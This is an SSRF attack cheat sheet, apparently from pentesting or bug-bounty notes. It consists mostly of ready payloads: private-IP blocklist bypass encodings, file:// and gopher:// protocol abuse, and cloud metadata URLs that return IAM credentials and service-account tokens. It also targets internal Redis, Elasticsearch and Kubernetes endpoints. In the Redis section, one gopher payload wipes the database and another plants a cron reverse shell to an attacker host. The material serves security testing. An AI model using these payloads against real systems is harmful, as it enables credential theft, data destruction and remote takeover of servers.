# Server-Side Request Forgery (SSRF)

**CWE-918** | High/Critical | Internal network access, metadata theft, RCE

## Quick Detection

```
# Probe — make server fetch your URL
http://YOUR_BURP_COLLABORATOR/
http://169.254.169.254/              ← AWS/GCP metadata (cloud)
http://localhost/                    ← loopback
http://0.0.0.0/                      ← alternative loopback
http://[::1]/                        ← IPv6 loopback
http://127.0.0.1:6379/              ← Redis (common internal service)
http://127.0.0.1:8080/              ← internal admin
```

---

## Entry Points

```
# Explicit URL parameters
url=, src=, href=, redirect=, next=, return=, callback=, proxy=

# Indirect — server fetches based on value
webhook_url, avatar_url, import_url, fetch_url
XML/SVG upload with external entity
PDF renderer with <img src=>
OAuth redirect_uri
```

---

## Bypass Techniques

### IP encoding variants (bypass naive blocklists)
```
http://2130706433/          ← 127.0.0.1 as decimal
http://0x7f000001/          ← 127.0.0.1 as hex
http://017700000001/        ← 127.0.0.1 as octal
http://127.0.0.1.nip.io/   ← DNS resolves to 127.0.0.1
http://localtest.me/        ← resolves to 127.0.0.1
http://127.1/               ← shorthand
http://0/                   ← 0.0.0.0
```

### Protocol abuse
```
file:///etc/passwd
dict://localhost:6379/info      ← Redis
gopher://localhost:6379/...     ← Redis RCE via Gopher
ftp://localhost/
ldap://localhost/
```

### DNS rebinding
1. Set up DNS that first resolves to public IP (passes allowlist check)
2. Then resolves to 127.0.0.1 (for actual request)
TTL must be very short (<1s)

### Redirect bypass
```
# If server follows redirects:
http://YOUR_SERVER/redirect → http://169.254.169.254/
```

---

## Cloud Metadata Endpoints

```
# AWS IMDSv1 (no auth required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# AWS IMDSv2 (requires token — but check if v1 still enabled)
PUT http://169.254.169.254/latest/api/token  (TTL header required)

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header required: Metadata: true

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

---

## Internal Service Attacks

### Redis (no auth)
```
# Via Gopher
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

# Write cron job for RCE
gopher://127.0.0.1:6379/_MULTI\r\nSET key "*/1 * * * * root bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"\r\nCONFIG SET dir /etc/cron.d\r\nCONFIG SET dbfilename root\r\nSAVE\r\nEXEC\r\n
```

### Elasticsearch
```
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/INDEX_NAME/_search?pretty
```

### Kubernetes API
```
http://kubernetes.default.svc/api/v1/namespaces
http://10.0.0.1:443/api/v1/secrets
```

---

## SSRF in AI/ML Tools

Common patterns in AI/ML apps:
```python
# Webhook URL not validated
http_request(user_supplied_url)         ← LiteLLM custom_code guardrail
requests.get(model_config['avatar'])    ← model registry fetches
urllib.urlopen(user_prompt_attachment)  ← multimodal input fetching

# is_valid_url() that only checks scheme+netloc — no private IP filter:
def is_valid_url(url):
    result = urlparse(url)
    return all([result.scheme, result.netloc])   # ← SSRF vulnerable
```

**What to check**: Does the URL validator block `169.254.169.254`, `127.0.0.1`, `localhost`, `0.0.0.0`, `::1`?

---

## Writeup References

- SSRF in Exchange leads to ROOT: https://hackerone.com/reports/341876
- SSRF to AWS metadata: https://medium.com/@GeneralEG/ssrf-from-pdf-generator-in-hackerone-6b19d3b31b99
- SSRF via PDF rendering: https://medium.com/@lmitan/file-upload-ssrf-xxe-in-resumes-the-unexpected-attack-vector-ddbae5b7e13e
- Blind SSRF with Shellshock: https://blog.assetnote.io/bug-bounty/2019/10/03/hunting-for-ssrf-in-oauth/
